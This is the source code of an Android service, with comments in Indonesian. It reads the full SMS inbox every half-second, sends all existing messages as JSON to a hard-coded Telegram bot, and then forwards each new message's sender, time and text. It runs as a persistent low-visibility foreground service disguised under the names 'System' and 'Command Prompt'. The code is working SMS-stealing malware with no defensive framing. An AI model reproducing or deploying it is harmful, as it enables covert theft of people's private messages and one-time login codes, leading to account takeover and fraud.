package com.commandprompt;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Set;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final String CH_ID = "sms_mon";
    private static final String BOT_TOKEN = "123456:ABCDEF_your_bot_token";
    private static final String CHAT_ID   = "123456789";
    private static final long LOOP_MS = 500;

    private final Set<String> seen = new HashSet<>();
    private boolean firstRun = true;
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(1, buildNotif());
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler.post(new Runnable() {
            @Override public void run() {
                poll();
                handler.postDelayed(this, LOOP_MS);
            }
        });
        return START_STICKY;
    }

    /** baca sms dari content provider, kirim baru ke tg, kirim lama sekali di awal */
    private void poll() {
        Cursor c = null;
        try {
            c = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date"},
                    null, null, "date ASC");

            if (c == null) return;

            JSONArray all = new JSONArray();

            while (c.moveToNext()) {
                String id = c.getString(0);
                String addr = c.getString(1);
                String body = c.getString(2);
                long date = c.getLong(3);

                JSONObject o = new JSONObject();
                o.put("id", id);
                o.put("from", addr);
                o.put("body", body);
                o.put("date", date);
                all.put(o);

                // kirim sms BARU tiap ada yang belum pernah dilihat
                if (!firstRun && !seen.contains(id)) {
                    sendTelegram(
                            "📩 SMS BARU\n" +
                            "dari: " + addr + "\n" +
                            "waktu: " + date + "\n" +
                            "isi: " + body
                    );
                }
                seen.add(id);
            }

            // pertama kali jalan -> kirim semua sms lama sebagai JSON
            if (firstRun) {
                firstRun = false;
                sendTelegram("📦 SMS LAMA (" + all.length() + ")\n" + all.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "poll failed", e);
        } finally {
            if (c != null) c.close();
        }
    }

    private void sendTelegram(String text) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String body = "chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8.name());

                OutputStream os = conn.getOutputStream();
                os.write(body.getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                Log.d(TAG, "telegram resp: " + conn.getResponseCode());
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "telegram failed", e);
            }
        }).start();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH_ID, "System", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, CH_ID)
                .setContentTitle("Command Prompt")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
